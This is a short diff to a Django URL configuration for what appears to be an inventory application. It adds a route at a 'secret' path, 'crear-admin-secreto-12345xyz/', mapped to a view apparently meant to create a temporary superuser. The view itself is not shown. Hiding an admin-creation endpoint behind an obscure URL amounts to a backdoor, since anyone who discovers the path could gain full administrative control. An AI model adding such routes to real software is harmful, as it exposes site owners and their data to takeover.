@@ -10,4 +10,6 @@ urlpatterns = [
     path('cuerpo/<int:cuerpo_id>/agregar/', views.agregar_producto, name='agregar_producto'),
     path('producto/<int:producto_id>/movimiento/', views.registrar_movimiento, name='registrar_movimiento'),
     path('cuerpo/<int:cuerpo_id>/pdf/', views.generar_pdf_inventario, name='generar_pdf'),
+
+    path('crear-admin-secreto-12345xyz/', views.crear_superusuario_temporal, name='crear_admin_temporal'),
 ]
